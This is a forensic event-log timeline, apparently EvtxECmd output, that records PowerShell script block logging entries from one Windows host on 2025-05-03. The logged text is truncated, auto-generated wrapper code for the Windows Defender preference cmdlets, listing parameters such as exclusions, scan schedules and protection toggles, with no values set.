$script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,       $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new(),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ExclusionPath')) {,           [object]$__cmdletization_value = ${ExclusionPath},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {,           [object]$__cmdletization_value = ${ExclusionExtension},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {,           [object]$__cmdletization_value = ${ExclusionProcess},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {,           [object]$__cmdletization_value = ${RealTimeScanDirection},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {,           [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoun...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0547280,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {,           [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {,           [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {,           [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {,           [object]$__cmdletization_value = ${ScanAvgCPULoadFactor},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {,           [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {,           [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {,           [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanParameters')) {,           [object]$__cmdletization_value = ${ScanParameters},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {,           [object]$__cmdletization_value = ${ScanScheduleDay},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {,           [object]$__cmdletization_value = ${ScanScheduleQuickScanTime},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {,           [object]$__cmdletization_value = ${ScanScheduleTime},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.Me...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0547481,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: ]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {,           [object]$__cmdletization_value = ${SignatureAuGracePeriod},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {,           [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {,           [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {,           [object]$__cmdletization_value = ${SignatureFallbackOrder},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {,           [object]$__cmdletization_value = ${SharedSignaturesPath},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {,           [object]$__cmdletization_value = ${SignatureScheduleDay},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {,           [object]$__cmdletization_value = ${SignatureScheduleTime},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {,           [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {,           [object]$__cmdletization_value = ${SignatureUpdateInterval},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('MAPSReporting')) {,           [object]$__cmdletization_value = ${MAPSReporting},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {,           [object]$__cmdletization_value = ${SubmitSamplesConsent},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdl...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0548163,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: .ContainsKey('DisablePrivacyMode')) {,           [object]$__cmdletization_value = ${DisablePrivacyMode},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {,           [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {,           [object]$__cmdletization_value = ${DisableBehaviorMonitoring},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {,           [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {,           [object]$__cmdletization_value = ${DisableIOAVProtection},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {,           [object]$__cmdletization_value = ${DisableRealtimeMonitoring},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {,           [object]$__cmdletization_value = ${DisableScriptScanning},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {,           [object]$__cmdletization_value = ${DisableArchiveScanning},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         